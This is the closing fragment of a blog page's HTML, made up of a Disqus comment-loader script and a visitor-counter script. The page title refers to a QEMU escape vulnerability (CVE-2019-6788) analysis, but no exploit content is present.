src="/js/main.js"></script><div class="js-pjax"><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://www.lyyl.online/posts/882088222.html'
    this.page.identifier = 'posts/882088222.html'
    this.page.title = 'CVE-2019-6788-Qemu逃逸漏洞复现-分析'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://lyyl-online.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Disqus' === 'Disqus' || !false) {
  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>